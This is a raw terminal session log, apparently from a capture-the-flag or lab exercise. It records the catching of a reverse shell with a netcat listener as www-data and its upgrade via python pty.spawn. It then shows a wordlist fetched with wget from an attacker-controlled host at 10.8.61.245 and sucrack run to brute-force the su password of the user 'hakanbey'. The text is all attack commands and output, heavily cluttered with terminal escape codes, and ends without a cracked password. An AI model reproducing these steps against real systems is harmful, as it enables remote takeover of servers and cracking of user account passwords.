+Script started on 2025-02-21 11:00:09+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 11258
+[KSOCKET: Shell has connected! PID: 5835
+[K[K[?2004hpython3 -c 'import pr[Kty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kwww-data@ubuntu:/var/www/subdomain$ [Kwww-data@ubuntu:/var/www/subdomain$ [K[?2004hwww-data@ubuntu:/var/www/subdomain$ cd /tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+10.8.61.245  custom.txt
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ cp -rv 10.8.61.245/sucrack/src/sucrack .[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcp -rv 10.8.61.245/sucrack/src/sucrack .
+[Kcp -rv 10.8.61.245/sucrack/src/sucrack .
+'10.8.61.245/sucrack/src/sucrack' -> './sucrack'
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+10.8.61.245  custom.txt  sucrack
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ./sucrack -w 100 -b 500 -u hakanbey ./custom.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./sucrack -w 100 -b 500 -u hakanbey ./custom.txt
+[K./sucrack -w 100 -b 500 -u hakanbey ./custom.txt
+[K
+[?2004l
+Script done on 2025-02-21 11:08:04+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-02-21 11:08:46+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 11341
+[KSOCKET: Shell has connected! PID: 7488
+[K[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kwww-data@ubuntu:/var/www/subdomain$ [Kwww-data@ubuntu:/var/www/subdomain$ [K[?2004hwww-data@ubuntu:/var/www/subdomain$ cd /tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K10.8.61.245  custom.txt  sucrack
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$   [Krm custom.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrm custom.txt
+[Krm custom.txt
+[Kwww-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ [7mwget http://10.8.61.245/sucrack.sh[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1Pwget http://10.8.61.245/sucrack.s[K[K[K[K[K[K[K[K[Kcustom.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget http://10.8.61.245/custom.txt
+[Kwget http://10.8.61.245/custom.txt
+[K--2025-02-21 08:10:07--  http://10.8.61.245/custom.txt
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 803891 (785K) [text/plain]
+Saving to: 'custom.txt'
+
+custom.txt            0%[                    ]       0  --.-KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               [Kcustom.txt            2%[                    ]  20.00K  77.2KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               custom.txt            5%[>                   ]  43.68K  78.3KB/s               [Kcustom.txt            5%[>                   ]  43.68K  78.3KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               custom.txt            5%[>                   ]  43.68K  78.3KB/s               custom.txt           11%[=>                  ]  86.49K   108KB/s               [Kcustom.txt           11%[=>                  ]  86.49K   108KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               custom.txt            5%[>                   ]  43.68K  78.3KB/s               custom.txt           11%[=>                  ]  86.49K   108KB/s               custom.txt           13%[=>                  ] 102.49K  15.1KB/s    eta 45s    [Kcustom.txt           13%[=>                  ] 102.49K  15.1KB/s    eta 45s    [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               custom.txt            5%[>                   ]  43.68K  78.3KB/s               custom.txt           11%[=>                  ]  86.49K   108KB/s               custom.txt           13%[=>                  ] 102.49K  15.1KB/s    eta 45s    custom.txt           18%[==>                 ] 144.36K  20.5KB/s    eta 45s    [Kcustom.txt           18%[==>                 ] 144.36K  20.5KB/s    eta 45s    [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               custom.txt            5%[>                   ]  43.68K  78.3KB/s               custom.txt           11%[=>                  ]  86.49K   108KB/s               custom.txt           13%[=>                  ] 102.49K  15.1KB/s    eta 45s    custom.txt           18%[==>                 ] 144.36K  20.5KB/s    eta 45s    custom.txt           24%[===>                ] 190.99K  26.0KB/s    eta 45s    [Kcustom.txt           24%[===>                ] 190.99K  26.0KB/s    eta 45s    [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               custom.txt            5%[>                   ]  43.68K  78.3KB/s               custom.txt           11%[=>                  ]  86.49K   108KB/s               custom.txt           13%[=>                  ] 102.49K  15.1KB/s    eta 45s    custom.txt           18%[==>                 ] 144.36K  20.5KB/s    eta 45s    custom.txt           24%[===>                ] 190.99K  26.0KB/s    eta 45s    custom.txt           29%[====>               ] 235.32K  30.7KB/s    eta 45s    [Kcustom.txt           29%[====>               ] 235.32K  30.7KB/s    eta 45s    [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               custom.txt            5%[>                   ]  43.68K  78.3KB/s               custom.txt           11%[=>                  ]  86.49K   108KB/s               custom.txt           13%[=>                  ] 102.49K  15.1KB/s    eta 45s    custom.txt           18%[==>                 ] 144.36K  20.5KB/s    eta 45s    custom.txt           24%[===>                ] 190.99K  26.0KB/s    eta 45s    custom.txt           29%[====>               ] 235.32K  30.7KB/s    eta 45s    custom.txt           34%[=====>              ] 269.25K  26.1KB/s    eta 20s    [Kcustom.txt           34%[=====>              ] 269.25K  26.1KB/s    eta 20s    [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               custom.txt            5%[>                   ]  43.68K  78.3KB/s               custom.txt           11%[=>                  ]  86.49K   108KB/s               custom.txt           13%[=>                  ] 102.49K  15.1KB/s    eta 45s    custom.txt           18%[==>                 ] 144.36K  20.5KB/s    eta 45s    custom.txt           24%[===>                ] 190.99K  26.0KB/s    eta 45s    custom.txt           29%[====>               ] 235.32K  30.7KB/s    eta 45s    custom.txt           34%[=====>              ] 269.25K  26.1KB/s    eta 20s    custom.txt           43%[=======>            ] 343.32K  32.3KB/s    eta 20s    [Kcustom.txt           43%[=======>            ] 343.32K  32.3KB/s    eta 20s    [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               custom.txt            5%[>                   ]  43.68K  78.3KB/s               custom.txt           11%[=>                  ]  86.49K   108KB/s               custom.txt           13%[=>                  ] 102.49K  15.1KB/s    eta 45s    custom.txt           18%[==>                 ] 144.36K  20.5KB/s    eta 45s    custom.txt           24%[===>                ] 190.99K  26.0KB/s    eta 45s    custom.txt           29%[====>               ] 235.32K  30.7KB/s    eta 45s    custom.txt           34%[=====>              ] 269.25K  26.1KB/s    eta 20s    custom.txt           43%[=======>            ] 343.32K  32.3KB/s    eta 20s    custom.txt           48%[========>           ] 378.21K  34.5KB/s    eta 20s    [Kcustom.txt           48%[========>           ] 378.21K  34.5KB/s    eta 20s    [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               custom.txt            5%[>                   ]  43.68K  78.3KB/s               custom.txt           11%[=>                  ]  86.49K   108KB/s               custom.txt           13%[=>                  ] 102.49K  15.1KB/s    eta 45s    custom.txt           18%[==>                 ] 144.36K  20.5KB/s    eta 45s    custom.txt           24%[===>                ] 190.99K  26.0KB/s    eta 45s    custom.txt           29%[====>               ] 235.32K  30.7KB/s    eta 45s    custom.txt           34%[=====>              ] 269.25K  26.1KB/s    eta 20s    custom.txt           43%[=======>            ] 343.32K  32.3KB/s    eta 20s    custom.txt           48%[========>           ] 378.21K  34.5KB/s    eta 20s    custom.txt           54%[=========>          ] 426.08K  38.0KB/s    eta 20s    [Kcustom.txt           54%[=========>          ] 426.08K  38.0KB/s    eta 20s    [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            2%[                    ]  20.00K  77.2KB/s               custom.txt            5%[>                   ]  43.68K  78.3KB/s               custom.txt           11%[=>                  ]  86.49K   108KB/s               custom.txt           13%[=>                  ] 102.49K  15.1KB/s    eta 45s    custom.txt           18%[==>                 ] 144.36K  20.5KB/s    eta 45s    custom.txt           24%[===>                ] 190.99K  26.0KB/s    eta 45s    custom.txt           29%[====>               ] 235.32K  30.7KB/s    eta 45s    custom.txt           34%[=====>              ] 269.25K  26.1KB/s    eta 20s    custom.txt           43%[=======>            ] 343.32K  32.3KB/s    eta 20s    custom.txt           48%[========>           ] 378.21K  34.5KB/s    eta 20s    custom.txt           54%[=========>          ] 426.08K  38.0KB/s    eta 20s    custom.txt           56%[==========>         ] 442.08K  35.4KB/s    eta 10s    custom.txt          100%[===================>] 785.05K  62.9KB/s    in 12s     
+
+[K2025-02-21 08:10:20 (62.9 KB/s) - 'custom.txt' saved [803891/803891]
+
+[Kwww-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ [7msucrack -w 100 -b 500 -u hakanbey[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsucrack -w 100 -b 500 -u hakanbey
+[Ksucrack -w 100 -b 500 -u hakanbey
+[Kbash: sucrack: command not found
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ .[7msucrack -w 100 -b 500 -u hakanbey[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1Psucrack -w 100 -b 500 -u hakanbe[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K./[7msucrack -w 100 -b 500 -u hakanbey[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csucrack -w 100 -b 500 -u hakanbey custom.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./sucrack -w 100 -b 500 -u hakanbey custom.txt
+[K./sucrack -w 100 -b 500 -u hakanbey custom.txt
+[K[K[?2004h[?2004l[?2004h
+[K16486/803891
+[K[K[?2004h[?2004l[?2004h
+[K16634/803891
+[K[K[?2004h[?2004l[?2004h
+[K16634/803891
+[K[K[?2004h[?2004l[?2004h
+[K16634/803891
+[K[K[?2004h[?2004l[?2004h
+[K19483/803891
+[K
+[?2004l
+Script done on 2025-02-21 11:22:10+03:00 [COMMAND_EXIT_CODE="1"]
